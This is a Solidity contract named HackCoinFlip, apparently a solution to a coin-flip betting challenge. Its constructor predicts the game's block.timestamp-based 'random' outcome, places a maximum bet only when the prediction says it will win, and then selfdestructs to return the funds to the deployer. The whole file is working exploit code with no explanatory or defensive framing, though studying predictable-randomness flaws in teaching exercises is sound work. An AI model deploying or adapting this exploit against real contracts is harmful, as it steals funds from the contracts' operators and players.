pragma solidity ^0.5.0;

interface CoinFlipGameInterface {
    function bet() external payable;
    function maxBet() external view returns(uint256);
}

contract HackCoinFlip{
    
    constructor(address payable addr) public payable{
        CoinFlipGameInterface c = CoinFlipGameInterface(addr);

        if(random() % 2 != 0){
            c.bet.value(c.maxBet())();
        }
        
        selfdestruct(msg.sender);
    }
    
    function random() private view returns (uint8) {
      return uint8(uint256(keccak256(abi.encodePacked(block.timestamp)))%251);
   }
}
